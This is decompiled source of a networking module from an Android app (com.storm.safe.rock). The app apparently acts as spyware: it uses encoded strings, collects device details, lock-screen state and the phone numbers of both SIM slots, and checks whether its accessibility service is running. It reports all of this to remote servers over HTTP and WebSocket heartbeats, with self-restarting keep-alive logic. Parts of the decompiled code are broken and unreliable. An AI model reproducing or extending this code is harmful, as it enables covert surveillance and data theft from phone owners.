package com.storm.safe.rock.service.modules;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkRequest;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.network.C0268a1;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.AbstractC0385a0;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicIntegerFieldUpdater;
import java.util.concurrent.atomic.AtomicLongFieldUpdater;
import java.util.concurrent.atomic.AtomicReferenceFieldUpdater;
import kotlin.Pair;
import kotlin.Result;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.internal.Lambda;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.channels.BufferOverflow;
import kotlinx.coroutines.channels.C0786a0;
import kotlinx.coroutines.sync.C0789a0;
import kotlinx.coroutines.sync.C0790a1;
import org.json.JSONException;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0494fg;
import p000.AbstractC0575hb;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0717jg;
import p000.AbstractC0765ko;
import p000.AbstractC1117qo;
import p000.AbstractC1229so;
import p000.AbstractC1262tj;
import p000.C0561gy;
import p000.C0562gz;
import p000.C0574ha;
import p000.C0576hc;
import p000.C0794ks;
import p000.C1108qf;
import p000.C1228sn;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.fe1;
import p000.h10;
import p000.kg1;
import p000.kj0;
import p000.l10;
import p000.lj0;
import p000.mj0;
import p000.sc0;
import p000.t60;
import p000.tz0;
import p000.u11;
import p000.v00;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.a8 */
/* loaded from: classes2.dex */
public final class C0323a8 {

    /* renamed from: e0 */
    public static final lj0 f53097e0 = new lj0(null);

    /* renamed from: e1 */
    public static final Object f53098e1 = new Object();

    /* renamed from: e2 */
    public static volatile C0323a8 f53099e2;

    /* renamed from: a0 */
    public final Context f53100a0;

    /* renamed from: a1 */
    public C0268a1 f53101a1;

    /* renamed from: a2 */
    public C0267a0 f53102a2;

    /* renamed from: a3 */
    public volatile boolean f53103a3;

    /* renamed from: a4 */
    public volatile boolean f53104a4;

    /* renamed from: a9 */
    public volatile int f53109a9;

    /* renamed from: b0 */
    public volatile int f53110b0;

    /* renamed from: b4 */
    public mj0 f53114b4;

    /* renamed from: b5 */
    public ConnectivityManager f53115b5;

    /* renamed from: b6 */
    public volatile long f53116b6;

    /* renamed from: b7 */
    public volatile Lambda f53117b7;

    /* renamed from: b8 */
    public volatile boolean f53118b8;

    /* renamed from: c1 */
    public u11 f53121c1;

    /* renamed from: c6 */
    public volatile int f53126c6;

    /* renamed from: c8 */
    public volatile int f53128c8;

    /* renamed from: d0 */
    public volatile boolean f53130d0;

    /* renamed from: d1 */
    public long f53131d1;

    /* renamed from: d3 */
    public volatile boolean f53133d3;

    /* renamed from: d4 */
    public long f53134d4;

    /* renamed from: d5 */
    public volatile int f53135d5;

    /* renamed from: d6 */
    public long f53136d6;

    /* renamed from: d7 */
    public int f53137d7;

    /* renamed from: d8 */
    public int f53138d8;

    /* renamed from: d9 */
    public volatile long f53139d9;

    /* renamed from: a5 */
    public String f53105a5 = "";

    /* renamed from: a6 */
    public int f53106a6 = 8080;

    /* renamed from: a7 */
    public String f53107a7 = "";

    /* renamed from: a8 */
    public List f53108a8 = EmptyList.f57568a0;

    /* renamed from: b1 */
    public final int f53111b1 = 5;

    /* renamed from: b2 */
    public final Object f53112b2 = new Object();

    /* renamed from: b3 */
    public final Object f53113b3 = new Object();

    /* renamed from: b9 */
    public final C0789a0 f53119b9 = new C0789a0();

    /* renamed from: c0 */
    public String f53120c0 = "";

    /* renamed from: c2 */
    public final long f53122c2 = 25000;

    /* renamed from: c3 */
    public final long f53123c3 = 5000;

    /* renamed from: c4 */
    public final long f53124c4 = 30000;

    /* renamed from: c5 */
    public final C0794ks f53125c5 = new C0794ks(BufferOverflow.f57668a1);

    /* renamed from: c7 */
    public final int f53127c7 = 5;

    /* renamed from: c9 */
    public volatile int f53129c9 = -1;

    /* renamed from: d2 */
    public final LinkedBlockingQueue f53132d2 = new LinkedBlockingQueue(10);

    public C0323a8(Context context) {
        this.f53100a0 = context;
    }

    /* renamed from: a0 */
    public static final void m211633a0(C0323a8 c0323a8) {
        if (!c0323a8.f53103a3 || c0323a8.f53102a2 == null) {
            return;
        }
        try {
            JSONObject jSONObjectM211637a2 = c0323a8.m211637a2();
            jSONObjectM211637a2.put("type", StringUtil.m212470a0("L1wHM049MyZSMDlNEz9MLA=="));
            jSONObjectM211637a2.put("sessionId", c0323a8.f53107a7);
            C0267a0 c0267a0 = c0323a8.f53102a2;
            if (c0267a0 == null) {
                t60.m214724f2("dataSyncClient");
                throw null;
            }
            if (!c0267a0.m211369b0(jSONObjectM211637a2)) {
                t60.m214726f4("NetworkManager", "WS心跳发送失败");
                c0323a8.f53103a3 = false;
            } else {
                c0323a8.m211653b9();
                if (c0323a8.f53126c6 < c0323a8.f53127c7) {
                    c0323a8.f53126c6++;
                }
                c0323a8.f53128c8++;
            }
        } catch (Exception e) {
            tz0.m214810b0("WS心跳失败: ", e.getMessage(), "NetworkManager");
            c0323a8.f53103a3 = false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:45:0x00c2  */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static Pair m211634a9(String str) {
        String str2;
        String string;
        String str3 = "localhost";
        if (AbstractC0779a1.m213663b6(str)) {
            return new Pair("localhost", 8080);
        }
        if (AbstractC0779a1.m213652a5(str, ";", false) && (str2 = (String) AbstractC0715je.m213291h8(AbstractC0779a1.m213677d0(str, new String[]{";"}, 6))) != null && (string = AbstractC0779a1.m213687e0(str2).toString()) != null) {
            str = string;
        }
        boolean z = AbstractC0779a1.m213679d2(str, false, "https://") || AbstractC0779a1.m213679d2(str, false, "wss://");
        String str4 = (String) AbstractC0715je.m213291h8(AbstractC0779a1.m213677d0(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(str, "ws://", ""), "wss://", ""), "http://", ""), "https://", ""), new String[]{"/"}, 6));
        String str5 = str4 != null ? str4 : "";
        if (AbstractC0779a1.m213663b6(str5)) {
            return new Pair("localhost", Integer.valueOf(z ? 443 : 8080));
        }
        List listM213677d0 = AbstractC0779a1.m213677d0(str5, new String[]{":"}, 6);
        String str6 = (String) AbstractC0715je.m213291h8(listM213677d0);
        if (str6 != null) {
            if (AbstractC0779a1.m213663b6(str6)) {
                str6 = null;
            }
            if (str6 != null) {
                str3 = str6;
            }
        }
        if (listM213677d0.size() > 1) {
            Integer numM213685d8 = AbstractC0779a1.m213685d8((String) listM213677d0.get(1));
            if (numM213685d8 != null) {
                iIntValue = numM213685d8.intValue();
            } else if (z) {
                iIntValue = 443;
            }
        } else if (z) {
        }
        return new Pair(str3, Integer.valueOf(iIntValue));
    }

    /* renamed from: d5 */
    public static boolean m211635d5(String str) {
        return AbstractC0779a1.m213679d2(str, false, "https://") || AbstractC0779a1.m213679d2(str, false, "wss://");
    }

    /* renamed from: a1 */
    public final JSONObject m211636a1() throws JSONException {
        List list = AbstractC1229so.f60031a0;
        Context context = this.f53100a0;
        C1228sn c1228snM214638a3 = AbstractC1229so.m214638a3(context);
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("deviceId", c1228snM214638a3.f60017a0);
        jSONObject.put("deviceName", c1228snM214638a3.f60018a1);
        jSONObject.put("model", Build.MODEL);
        jSONObject.put("brand", c1228snM214638a3.f60019a2);
        jSONObject.put("manufacturer", Build.MANUFACTURER);
        jSONObject.put("osVersion", Build.VERSION.RELEASE);
        jSONObject.put("sdkVersion", c1228snM214638a3.f60020a3);
        jSONObject.put("appName", c1228snM214638a3.f60021a4);
        jSONObject.put("appVersion", c1228snM214638a3.f60022a5);
        jSONObject.put("batteryLevel", c1228snM214638a3.f60023a6);
        jSONObject.put("isCharging", c1228snM214638a3.f60024a7);
        jSONObject.put("screenWidth", c1228snM214638a3.f60025a8);
        jSONObject.put("screenHeight", c1228snM214638a3.f60026a9);
        jSONObject.put("firstInstallTime", c1228snM214638a3.f60027b0);
        jSONObject.put("hasSim", c1228snM214638a3.f60028b1);
        jSONObject.put("phoneNumber", c1228snM214638a3.f60029b2);
        jSONObject.put("phoneNumber2", c1228snM214638a3.f60030b3);
        jSONObject.put("networkType", AbstractC1229so.m214642a7(context));
        String str = null;
        try {
            JSONObject jSONObjectM213605a3 = AbstractC0765ko.m213605a3(context);
            String strOptString = jSONObjectM213605a3 != null ? jSONObjectM213605a3.optString("ownerUsername") : null;
            if (strOptString == null || AbstractC0779a1.m213663b6(strOptString)) {
                t60.m214726f4("ConfigReader", "配置文件中没有ownerUsername或为空");
            } else {
                str = strOptString;
            }
        } catch (Exception e) {
            t60.m214705c6("ConfigReader", "获取配置项ownerUsername失败", e);
        }
        if (str != null && !AbstractC0779a1.m213663b6(str)) {
            jSONObject.put("ownerUsername", str);
        }
        jSONObject.put("timestamp", System.currentTimeMillis());
        return jSONObject;
    }

    /* JADX WARN: Removed duplicated region for block: B:142:0x0120 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0128  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0135  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0137  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x0143  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x014f  */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final JSONObject m211637a2() throws JSONException {
        boolean zIsCharging;
        int activeSubscriptionInfoCount;
        boolean z;
        boolean z2;
        Intent intentRegisterReceiver;
        int i = -1;
        try {
            intentRegisterReceiver = this.f53100a0.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        } catch (Exception unused) {
        }
        if (intentRegisterReceiver != null) {
            int intExtra = intentRegisterReceiver.getIntExtra("level", -1);
            int intExtra2 = intentRegisterReceiver.getIntExtra("scale", 100);
            int i2 = (intExtra < 0 || intExtra2 <= 0) ? -1 : (intExtra * 100) / intExtra2;
            try {
                int intExtra3 = intentRegisterReceiver.getIntExtra("plugged", -1);
                zIsCharging = intExtra3 == 1 || intExtra3 == 2 || intExtra3 == 4;
                i = i2;
            } catch (Exception unused2) {
                i = i2;
            }
        } else {
            zIsCharging = false;
        }
        if (i < 0) {
            try {
                Object systemService = this.f53100a0.getSystemService("batterymanager");
                BatteryManager batteryManager = systemService instanceof BatteryManager ? (BatteryManager) systemService : null;
                if (batteryManager != null) {
                    int intProperty = batteryManager.getIntProperty(4);
                    if (intProperty >= 0 && intProperty < 101) {
                        try {
                            zIsCharging = batteryManager.isCharging();
                        } catch (Exception unused3) {
                        }
                        i = intProperty;
                    }
                }
            } catch (Exception unused4) {
            }
        }
        if (i > 0) {
            this.f53129c9 = i;
            this.f53130d0 = zIsCharging;
        } else if (i < 0 && this.f53129c9 > 0) {
            i = this.f53129c9;
            zIsCharging = this.f53130d0;
        }
        Object systemService2 = this.f53100a0.getSystemService("power");
        PowerManager powerManager = systemService2 instanceof PowerManager ? (PowerManager) systemService2 : null;
        boolean zIsInteractive = powerManager != null ? powerManager.isInteractive() : true;
        Object systemService3 = this.f53100a0.getSystemService("keyguard");
        KeyguardManager keyguardManager = systemService3 instanceof KeyguardManager ? (KeyguardManager) systemService3 : null;
        boolean z3 = (keyguardManager != null ? keyguardManager.isKeyguardLocked() : false) || !zIsInteractive;
        boolean zIsServiceRunning = dqtvuisjd.f52358m1.isServiceRunning();
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("deviceId", this.f53107a7);
        jSONObject.put("timestamp", System.currentTimeMillis());
        jSONObject.put("wsConnected", this.f53103a3);
        jSONObject.put("accessibilityAlive", zIsServiceRunning);
        if (i >= 0) {
            jSONObject.put("batteryLevel", i);
            jSONObject.put("isCharging", zIsCharging);
        }
        jSONObject.put("isLocked", z3);
        jSONObject.put("isScreenOn", zIsInteractive);
        List list = AbstractC1229so.f60031a0;
        jSONObject.put("networkType", AbstractC1229so.m214642a7(this.f53100a0));
        try {
            Object systemService4 = this.f53100a0.getSystemService("phone");
            TelephonyManager telephonyManager = systemService4 instanceof TelephonyManager ? (TelephonyManager) systemService4 : null;
            Object systemService5 = this.f53100a0.getSystemService("telephony_subscription_service");
            SubscriptionManager subscriptionManager = systemService5 instanceof SubscriptionManager ? (SubscriptionManager) systemService5 : null;
            if (subscriptionManager != null) {
                try {
                    activeSubscriptionInfoCount = subscriptionManager.getActiveSubscriptionInfoCount();
                } catch (Exception unused5) {
                }
                if (telephonyManager == null) {
                    try {
                        z2 = telephonyManager.getSimState() == 1;
                    } catch (Exception unused6) {
                    }
                    if (z2) {
                        z = false;
                        jSONObject.put("hasSim", activeSubscriptionInfoCount <= 0 || z);
                        if (this.f53128c8 % 10 == 0) {
                            List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager != null ? subscriptionManager.getActiveSubscriptionInfoList() : null;
                            if (!(activeSubscriptionInfoList == null || activeSubscriptionInfoList.isEmpty())) {
                                for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                                    int simSlotIndex = subscriptionInfo.getSimSlotIndex();
                                    String str = "";
                                    if (simSlotIndex == 0) {
                                        String number = subscriptionInfo.getNumber();
                                        if (number != null) {
                                            str = number;
                                        }
                                        jSONObject.put("phoneNumber", str);
                                    } else if (simSlotIndex == 1) {
                                        String number2 = subscriptionInfo.getNumber();
                                        if (number2 != null) {
                                            str = number2;
                                        }
                                        jSONObject.put("phoneNumber2", str);
                                    }
                                }
                            }
                        }
                    } else if (telephonyManager != null) {
                        boolean z4 = telephonyManager.getSimState() == 0;
                        if (!z4) {
                            z = true;
                        }
                        if (activeSubscriptionInfoCount <= 0) {
                            jSONObject.put("hasSim", activeSubscriptionInfoCount <= 0 || z);
                            if (this.f53128c8 % 10 == 0) {
                            }
                        }
                    }
                }
            } else {
                activeSubscriptionInfoCount = 0;
                if (telephonyManager == null) {
                }
            }
        } catch (Exception unused7) {
        }
        if (this.f53126c6 < this.f53127c7) {
            try {
                List list2 = AbstractC1229so.f60031a0;
                C1228sn c1228snM214638a3 = AbstractC1229so.m214638a3(this.f53100a0);
                jSONObject.put("deviceName", c1228snM214638a3.f60018a1);
                jSONObject.put("model", Build.MODEL);
                jSONObject.put("brand", c1228snM214638a3.f60019a2);
                jSONObject.put("osVersion", Build.VERSION.RELEASE);
                jSONObject.put("appVersion", c1228snM214638a3.f60022a5);
                jSONObject.put("appName", c1228snM214638a3.f60021a4);
                jSONObject.put("screenWidth", c1228snM214638a3.f60025a8);
                jSONObject.put("screenHeight", c1228snM214638a3.f60026a9);
            } catch (Exception unused8) {
            }
        }
        return jSONObject;
    }

    /* renamed from: a3 */
    public final void m211638a3() {
        try {
            u11 u11Var = this.f53121c1;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            this.f53121c1 = null;
            C0267a0 c0267a0 = this.f53102a2;
            if (c0267a0 != null) {
                c0267a0.m211362a3();
            }
            this.f53103a3 = false;
            this.f53104a4 = false;
            this.f53126c6 = 0;
            this.f53128c8 = 0;
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "断开连接失败", e);
        }
        m211672d9();
        C0267a0 c0267a02 = this.f53102a2;
        if (c0267a02 != null) {
            c0267a02.m211362a3();
            c0267a02.f52271b1.removeCallbacksAndMessages(null);
            AbstractC1117qo.m214410a3(c0267a02.f52273b3);
        }
        this.f53118b8 = false;
        f53099e2 = null;
    }

    /* renamed from: a4 */
    public final void m211639a4() throws Throwable {
        String strM48c9;
        Throwable th;
        char c;
        String strM48c92;
        if (this.f53108a8.isEmpty()) {
            t60.m214704c5("NetworkManager", "❌ 服务器列表为空，无法配置");
            return;
        }
        String strM211654c0 = m211654c0();
        if (strM211654c0 == null) {
            t60.m214704c5("NetworkManager", "❌ 无法获取当前服务器URL");
            return;
        }
        Pair pairM211634a9 = m211634a9(strM211654c0);
        String str = (String) pairM211634a9.f57556a0;
        int iIntValue = ((Number) pairM211634a9.f57557a1).intValue();
        this.f53105a5 = str;
        this.f53106a6 = iIntValue;
        boolean zM211635d5 = m211635d5(strM211654c0);
        if (!zM211635d5) {
            strM48c9 = "http://" + str + ":" + iIntValue;
        } else if (iIntValue == 443) {
            strM48c9 = AbstractC0003a2.m48c9("https://", str);
        } else {
            strM48c9 = "https://" + str + ":" + iIntValue;
        }
        if (this.f53101a1 != null) {
            String deviceKeySalt = C0267a0.f52258b5.getDeviceKeySalt();
            th = null;
            C0268a1 c0268a1 = this.f53101a1;
            if (c0268a1 == null) {
                t60.m214724f2("httpManager");
                throw null;
            }
            c = '/';
            String str2 = this.f53107a7;
            t60.m214695b6(strM48c9, "serverUrl");
            t60.m214695b6(deviceKeySalt, "keySalt");
            c0268a1.f52278a1 = AbstractC0779a1.m213688e1(strM48c9, '/');
            c0268a1.f52279a2 = str2;
            c0268a1.f52280a3 = deviceKeySalt;
            int i = this.f53109a9 + 1;
            int size = this.f53108a8.size();
            StringBuilder sbM40c1 = AbstractC0003a2.m40c1("✅ HttpManager 已配置: ", strM48c9, " [服务器 ", i, "/");
            sbM40c1.append(size);
            sbM40c1.append("]");
            t60.m214714d6("NetworkManager", sbM40c1.toString());
        } else {
            th = null;
            c = '/';
            t60.m214726f4("NetworkManager", "⚠️ HttpManager 未初始化，跳过配置");
        }
        if (this.f53102a2 != null) {
            if (!zM211635d5) {
                strM48c92 = "ws://" + str + ":" + iIntValue;
            } else if (iIntValue == 443) {
                strM48c92 = AbstractC0003a2.m48c9("wss://", str);
            } else {
                strM48c92 = "wss://" + str + ":" + iIntValue;
            }
            C0267a0 c0267a0 = this.f53102a2;
            if (c0267a0 == null) {
                t60.m214724f2("dataSyncClient");
                throw th;
            }
            String str3 = this.f53107a7;
            t60.m214695b6(strM48c92, "serverUrl");
            c0267a0.f52269a9 = AbstractC0779a1.m213688e1(strM48c92, c);
            c0267a0.f52270b0 = str3;
            int i2 = this.f53109a9 + 1;
            int size2 = this.f53108a8.size();
            StringBuilder sbM40c12 = AbstractC0003a2.m40c1("✅ DataSyncClient 已配置: ", strM48c92, " [服务器 ", i2, "/");
            sbM40c12.append(size2);
            sbM40c12.append("]");
            t60.m214714d6("NetworkManager", sbM40c12.toString());
        }
    }

    /* renamed from: a5 */
    public final void m211640a5() throws Throwable {
        try {
            if (this.f53102a2 == null) {
                t60.m214726f4("NetworkManager", "⚠️ DataSyncClient 未初始化，跳过配置");
            } else if (this.f53108a8.isEmpty()) {
                t60.m214704c5("NetworkManager", "❌ 服务器列表为空，DataSyncClient 无法配置");
            } else {
                m211639a4();
            }
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "❌ 配置 DataSyncClient 失败", e);
        }
    }

    /* renamed from: a6 */
    public final void m211641a6() throws Throwable {
        Context context = this.f53100a0;
        try {
            String strM213604a2 = null;
            String string = context.getSharedPreferences(StringUtil.m212470a0("OEACLkg1MyZSPTtcAwVePRg6Xj8sSg=="), 0).getString(StringUtil.m212470a0("OFwDLEgqMztFPQ=="), null);
            if (string == null) {
                try {
                    strM213604a2 = AbstractC0765ko.m213604a2(context);
                } catch (Exception unused) {
                }
                string = strM213604a2;
            }
            if (string != null && string.length() != 0) {
                String strM213603a1 = AbstractC0765ko.m213603a1(context);
                if (strM213603a1.length() > 0) {
                    C0267a0.f52258b5.configureDeviceKeySalt(strM213603a1);
                    t60.m214714d6("NetworkManager", "✅ 设备密钥盐值已配置（API认证已启用）");
                } else {
                    t60.m214726f4("NetworkManager", "⚠️ 配置文件中缺少 deviceKeySalt，敏感API认证将失败");
                }
                m211650b6(string);
                m211639a4();
                return;
            }
            t60.m214704c5("NetworkManager", "❌ 未找到服务器配置");
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "❌ 配置 HttpManager 失败", e);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:44:0x0089, code lost:
    
        r9.set(r13, null);
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x008e, code lost:
    
        if (r12.f53104a4 != false) goto L79;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x0096, code lost:
    
        if (r12.f53105a5.length() != 0) goto L54;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x0098, code lost:
    
        m211641a6();
        m211640a5();
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x009f, code lost:
    
        r13 = th;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x00a0, code lost:
    
        r2 = r12;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x00a3, code lost:
    
        r13 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x00a4, code lost:
    
        r2 = r12;
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x00a8, code lost:
    
        if (r12.f53101a1 == null) goto L79;
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x00aa, code lost:
    
        r2.f52823a0 = r12;
        r2.f52826a3 = 1;
        r13 = m211636a1();
     */
    /* JADX WARN: Code restructure failed: missing block: B:57:0x00b2, code lost:
    
        if (r13 != r3) goto L59;
     */
    /* JADX WARN: Code restructure failed: missing block: B:59:0x00b5, code lost:
    
        r4 = r12;
     */
    /* JADX WARN: Code restructure failed: missing block: B:79:0x0107, code lost:
    
        r2 = r12;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:68:0x00ce A[Catch: all -> 0x0038, Exception -> 0x003b, TryCatch #0 {Exception -> 0x003b, blocks: (B:13:0x002f, B:66:0x00c8, B:68:0x00ce, B:69:0x00d9, B:71:0x00df, B:73:0x00e5), top: B:84:0x002f }] */
    /* JADX WARN: Removed duplicated region for block: B:69:0x00d9 A[Catch: all -> 0x0038, Exception -> 0x003b, TryCatch #0 {Exception -> 0x003b, blocks: (B:13:0x002f, B:66:0x00c8, B:68:0x00ce, B:69:0x00d9, B:71:0x00df, B:73:0x00e5), top: B:84:0x002f }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r2v11 */
    /* JADX WARN: Type inference failed for: r2v16 */
    /* JADX WARN: Type inference failed for: r2v17 */
    /* JADX WARN: Type inference failed for: r2v2, types: [com.storm.safe.rock.service.modules.NetworkManager$connectToServer$1, kotlin.coroutines.jvm.internal.ContinuationImpl] */
    /* JADX WARN: Type inference failed for: r2v4 */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211642a7(ContinuationImpl continuationImpl) throws Throwable {
        C0323a8 networkManager$connectToServer$1;
        int i;
        C0323a8 c0323a8;
        Object objM211372a2;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof NetworkManager$connectToServer$1) {
            NetworkManager$connectToServer$1 networkManager$connectToServer$12 = (NetworkManager$connectToServer$1) continuationImpl;
            int i2 = networkManager$connectToServer$12.f52826a3;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                networkManager$connectToServer$12.f52826a3 = i2 - Integer.MIN_VALUE;
                networkManager$connectToServer$1 = networkManager$connectToServer$12;
            } else {
                networkManager$connectToServer$1 = new NetworkManager$connectToServer$1(this, continuationImpl);
            }
        }
        Object objM211636a1 = networkManager$connectToServer$1.f52824a1;
        Object obj = CoroutineSingletons.f57606a0;
        int i3 = networkManager$connectToServer$1.f52826a3;
        try {
            if (i3 == 0) {
                kg1.m213544f4(objM211636a1);
                if (this.f53104a4) {
                    return c1351vv;
                }
                C0789a0 c0789a0 = this.f53119b9;
                c0789a0.getClass();
                AtomicIntegerFieldUpdater atomicIntegerFieldUpdater = C0790a1.f57703a3;
                AtomicReferenceFieldUpdater atomicReferenceFieldUpdater = C0789a0.f57700a4;
                while (true) {
                    int i4 = atomicIntegerFieldUpdater.get(c0789a0);
                    if (i4 > 1) {
                        do {
                            i = atomicIntegerFieldUpdater.get(c0789a0);
                            if (i > 1) {
                            }
                        } while (!atomicIntegerFieldUpdater.compareAndSet(c0789a0, i, 1));
                    } else {
                        if (i4 <= 0) {
                            t60.m214702c3("NetworkManager", "注册已在进行中，跳过重复调用");
                            return c1351vv;
                        }
                        if (atomicIntegerFieldUpdater.compareAndSet(c0789a0, i4, i4 - 1)) {
                            break;
                        }
                    }
                }
                return obj;
            }
            if (i3 == 1) {
                C0323a8 c0323a82 = networkManager$connectToServer$1.f52823a0;
                try {
                    kg1.m213544f4(objM211636a1);
                    JSONObject jSONObject = (JSONObject) objM211636a1;
                    C0268a1 c0268a1 = c0323a82.f53101a1;
                    if (c0268a1 == 0) {
                        t60.m214724f2("httpManager");
                        throw null;
                    }
                    networkManager$connectToServer$1.f52823a0 = c0323a82;
                    networkManager$connectToServer$1.f52826a3 = 2;
                    objM211372a2 = c0268a1.m211372a2(jSONObject, networkManager$connectToServer$1);
                    if (objM211372a2 != obj) {
                        c0323a8 = c0323a82;
                        int i5 = Result.f57558a1;
                        if (objM211372a2 instanceof Result.Failure) {
                        }
                    }
                    return obj;
                } catch (Exception e) {
                    e = e;
                    c0323a8 = c0323a82;
                } catch (Throwable th) {
                    th = th;
                    networkManager$connectToServer$1 = c0323a82;
                    networkManager$connectToServer$1.f53119b9.m213736a1(null);
                    throw th;
                }
            } else {
                if (i3 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                c0323a8 = networkManager$connectToServer$1.f52823a0;
                try {
                    kg1.m213544f4(objM211636a1);
                    objM211372a2 = ((Result) objM211636a1).f57559a0;
                    int i52 = Result.f57558a1;
                    if (objM211372a2 instanceof Result.Failure) {
                        c0323a8.f53104a4 = true;
                        t60.m214714d6("NetworkManager", "✅ HTTP注册成功");
                        c0323a8.m211653b9();
                    } else {
                        Throwable thM213607a0 = Result.m213607a0(objM211372a2);
                        t60.m214726f4("NetworkManager", "⚠️ HTTP注册失败: " + (thM213607a0 != null ? thM213607a0.getMessage() : null));
                        c0323a8.m211652b8();
                    }
                } catch (Exception e2) {
                    e = e2;
                }
            }
            t60.m214705c6("NetworkManager", "❌ 连接失败", e);
            c0323a8.m211652b8();
            c0323a8.f53119b9.m213736a1(null);
            return c1351vv;
        } catch (Throwable th2) {
            th = th2;
        }
    }

    /* renamed from: a8 */
    public final void m211643a8() {
        if (!this.f53118b8) {
            t60.m214726f4("NetworkManager", "⚠️ 未初始化，执行初始化");
            m211647b3();
            return;
        }
        if (m211648b4()) {
            return;
        }
        t60.m214726f4("NetworkManager", "⚠️ 检测到僵尸状态，重启保活...");
        t60.m214726f4("NetworkManager", "⚠️ 强制重启保活机制...");
        try {
            u11 u11Var = this.f53121c1;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            this.f53121c1 = null;
        } catch (Exception unused) {
        }
        m211670d7();
        try {
            m211672d9();
        } catch (Exception unused2) {
        }
        m211651b7();
        t60.m214714d6("NetworkManager", "✅ 保活机制已重启");
    }

    /* renamed from: b0 */
    public final String m211644b0() {
        String strM211654c0 = m211654c0();
        if (strM211654c0 == null) {
            return null;
        }
        Pair pairM211634a9 = m211634a9(strM211654c0);
        String str = (String) pairM211634a9.f57556a0;
        int iIntValue = ((Number) pairM211634a9.f57557a1).intValue();
        if (!m211635d5(strM211654c0)) {
            return "http://" + str + ":" + iIntValue;
        }
        if (iIntValue == 443) {
            return AbstractC0003a2.m48c9("https://", str);
        }
        return "https://" + str + ":" + iIntValue;
    }

    /* renamed from: b1 */
    public final C0267a0 m211645b1() {
        C0267a0 c0267a0 = this.f53102a2;
        if (c0267a0 == null) {
            return null;
        }
        if (c0267a0 != null) {
            return c0267a0;
        }
        t60.m214724f2("dataSyncClient");
        throw null;
    }

    /* renamed from: b2 */
    public final String m211646b2() {
        if (this.f53105a5.length() == 0) {
            return "";
        }
        String strM211654c0 = m211654c0();
        if (m211635d5(strM211654c0 != null ? strM211654c0 : "")) {
            int i = this.f53106a6;
            if (i == 443) {
                return AbstractC0003a2.m48c9("https://", this.f53105a5);
            }
            return "https://" + this.f53105a5 + ":" + i;
        }
        int i2 = this.f53106a6;
        if (i2 == 80) {
            return AbstractC0003a2.m48c9("http://", this.f53105a5);
        }
        return "http://" + this.f53105a5 + ":" + i2;
    }

    /* renamed from: b3 */
    public final void m211647b3() throws Throwable {
        if (this.f53118b8) {
            if (m211648b4()) {
                t60.m214702c3("NetworkManager", "✅ 已初始化且健康，跳过");
                return;
            }
            t60.m214726f4("NetworkManager", "⚠️ 已初始化但内部 Job 已死（僵尸状态），强制重启保活机制");
            t60.m214726f4("NetworkManager", "⚠️ 强制重启保活机制...");
            try {
                u11 u11Var = this.f53121c1;
                if (u11Var != null) {
                    u11Var.m215253a7(null);
                }
                this.f53121c1 = null;
            } catch (Exception unused) {
            }
            m211670d7();
            try {
                m211672d9();
            } catch (Exception unused2) {
            }
            m211651b7();
